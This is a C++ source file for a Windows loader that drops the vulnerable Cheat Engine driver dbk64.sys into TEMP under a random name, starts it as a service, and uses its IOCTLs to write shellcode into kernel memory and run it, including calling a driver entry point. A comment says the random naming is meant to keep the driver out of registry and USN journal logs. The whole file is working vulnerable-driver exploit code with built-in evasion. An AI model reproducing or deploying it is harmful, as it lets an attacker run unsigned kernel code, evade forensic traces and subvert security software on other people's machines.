#include "ce_driver.hpp"
char ce_driver::driver_name[100] = {};

std::wstring ce_driver::GetDriverNameW() {
	std::string t(ce_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring ce_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

BOOL ce_driver::Load() {
	BOOL result = FALSE;

	srand((unsigned)time(NULL) * GetCurrentThreadId());

	//Randomize name for log in registry keys, usn jornal and other shits
	
	memset(ce_driver::driver_name, 0, sizeof(ce_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20;
	for (int i = 0; i < len; ++i)
		ce_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	
    Log("Loading dbk64.sys driver: %s", ce_driver::driver_name);

	std::wstring driver_path = GetDriverPath();
    
    if (driver_path.empty()) {
		Error("Can't find TEMP folder");
		return result;
	}


#ifdef  _DEBUG

	// self compiled dbk64.sys
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(test_dbk64_driver_resource::driver), sizeof(test_dbk64_driver_resource::driver))) {
        Error("Failed to create vulnerable driver file");
		return result;
	}

#else

	// dbk64.sys
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(dbk64_driver_resource::driver), sizeof(dbk64_driver_resource::driver))) {
        Error("Failed to create vulnerable driver file");
		return result;
	}

#endif //  _DEBUG


	if (!service::RegisterAndStart(driver_path)) {
        Error("Failed to register and start service for the vulnerable driver");
		_wremove(driver_path.c_str());
		return result;
	}
	

	result = TRUE;
	return result;
}


UINT64 ce_driver::AllocateNonPagedMem(HANDLE hDevice, SIZE_T Size) {

    auto ioCtlCode = IOCTL_CE_ALLOCATEMEM_NONPAGED;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 Size;
    } inp = { Size };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(input),
        &bytesReturned,
        NULL
    );

    return inp.Size;
}

BOOL ce_driver::CreateSharedMemory(HANDLE hDevice, UINT64 kernelBuf, UINT64* sharedBuf, UINT64* Mdl, SIZE_T bufSize) {

    auto ioCtlCode = IOCTL_CE_MAP_MEMORY;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 FromPID;
        UINT64 ToPID;
        UINT64 address;
        DWORD size;
    } inp = {
        GetCurrentProcessId(),
        GetCurrentProcessId(),
        kernelBuf,
        bufSize
    };

    struct output
    {
        UINT64 FromMDL;
        UINT64 Address;
    } outp = { 0 };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &outp,
        sizeof(output),
        &bytesReturned,
        NULL
    );

    *sharedBuf = outp.Address;
    *Mdl = outp.FromMDL;

    return bRc;
}


BOOL ce_driver::UnMapSharedMemory(HANDLE hDevice, UINT64 sharedMemAddress, UINT64 Mdl) {

    auto ioCtlCode = IOCTL_CE_UNMAP_MEMORY;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct output
    {
        UINT64 FromMDL;
        UINT64 Address;
    } outp = { Mdl, sharedMemAddress };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &outp,
        sizeof(output),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return bRc;
}

BOOL ce_driver::ExecuteKernelModeShellCode(HANDLE hDevice, UINT64 shellcodeAddress, UINT64 shellcodeParam) {

    auto ioCtlCode = IOCTL_CE_EXECUTE_CODE;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64	functionaddress; //function address to call
        UINT64	parameters;
    } inp =
    {
        shellcodeAddress,
        shellcodeParam
    };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return bRc;
}

PVOID64 ce_driver::GetSystemProcAddress(HANDLE hDevice, PCWSTR routineName) {
    auto ioCtlCode = IOCTL_CE_GETPROCADDRESS;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    struct input
    {
        UINT64 s;
    } inp = { (UINT64)routineName };

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        &inp,
        sizeof(input),
        &inp,
        sizeof(inp),
        &bytesReturned,
        NULL
    );

    return (PVOID64)inp.s;
}

BOOL ce_driver::Dbk64DeviceIoControlTest(HANDLE hDevice) {

    auto ioCtlCode = IOCTL_CE_TEST;
    DWORD bytesReturned = 0;
    BOOL bRc = FALSE;

    bRc = DeviceIoControl(hDevice,
        (DWORD)ioCtlCode,
        NULL,
        0,
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return bRc;
}

bool ce_driver::CallDriverEntry(HANDLE hDevice, UINT64 EntryPoint) {

    auto ioCtlCode = IOCTL_CE_EXECUTE_CODE;
    DWORD returned;

    struct input
    {
        UINT64	functionaddress;
        UINT64	parameters;
    }inp = { EntryPoint, NULL };

    if (DeviceIoControl(hDevice, ioCtlCode, &inp, sizeof input, nullptr, 0, &returned, nullptr))
        return TRUE;
    else
        return FALSE;

}

PVOID64 ce_driver::WriteNonPagedMemory(HANDLE hDevice, PVOID lpBuffer, SIZE_T nSize) {

    UINT64 kernelShellcodeBuf = NULL;
    UINT64 sharedBuf = NULL;
    UINT64 Mdl = NULL;

    kernelShellcodeBuf = ce_driver::AllocateNonPagedMem(hDevice, nSize);
    if (kernelShellcodeBuf == NULL) {
        Error("AllocateNoPagedMem failed");
        return nullptr;
    }

    Log2("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);

    // Create an MDL for the buffer allocated above and make it accessible from user space.

    if (!ce_driver::CreateSharedMemory(hDevice, kernelShellcodeBuf, &sharedBuf, &Mdl, nSize)) {
        Error("CreateSharedMemory failed");
        return nullptr;
    }

    Log2("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", sharedBuf, Mdl);
    
    // Write shellcode to shared memory

    memcpy((void*)sharedBuf, lpBuffer, nSize);

    // Unmapping of memory allocated to user space

    if (!ce_driver::UnMapSharedMemory(hDevice, sharedBuf, Mdl)) {
        Error("UnMapSharedMemory failed");
        return nullptr;
    }

    Log2("Successfully removed shared memory from user space...");
    
    return (PVOID64)kernelShellcodeBuf;
}